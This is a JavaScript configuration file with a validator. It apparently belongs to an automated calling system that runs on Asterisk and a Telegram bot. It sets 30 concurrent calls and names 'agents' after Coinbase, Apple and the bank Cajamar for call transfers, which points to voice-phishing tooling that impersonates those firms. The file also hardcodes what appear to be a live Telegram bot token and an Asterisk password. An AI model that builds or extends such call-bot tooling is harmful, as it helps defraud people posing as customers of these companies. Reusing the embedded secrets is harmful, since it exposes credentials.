const config = {
  mongodbUri: "",
  telegramBotToken: "8693999917:AAEfVl5DH-OAqOoPKD3GAnqdrT--tQcc8W0",
  creatorTelegramId: "7383475549",
  concurrentCalls: 30,
  agents: ["coinbase", "apple", "bancocajamar"],
  asterisk: {
    host: "127.0.0.1",
    port: 5038,
    username: "bitcall",
    password: "Anton123@",
  },
  fileDownloadTimeout: 30000,
};

// Validate critical configuration
function validateConfig() {
  const errors = [];

  if (!config.mongodbUri) {
    errors.push("ERROR: mongodbUri is empty. Database connection will fail.");
  }

  if (!config.telegramBotToken) {
    errors.push("ERROR: telegramBotToken is missing. Telegram bot will not work.");
  }

  if (!config.creatorTelegramId) {
    errors.push("ERROR: creatorTelegramId is missing. Admin commands will fail.");
  }

  if (!config.asterisk?.host || !config.asterisk?.port) {
    errors.push("ERROR: Asterisk configuration incomplete. Call system will not work.");
  }

  if (!Array.isArray(config.agents) || config.agents.length === 0) {
    errors.push("ERROR: No agents configured. Transfer will fail.");
  }

  if (errors.length > 0) {
    console.error("[config] Configuration validation failed:");
    errors.forEach((err) => console.error(`  - ${err}`));
    return false;
  }

  console.log("[config] Configuration validated successfully");
  return true;
}

if (require.main === module) {
  validateConfig();
}

module.exports = config;
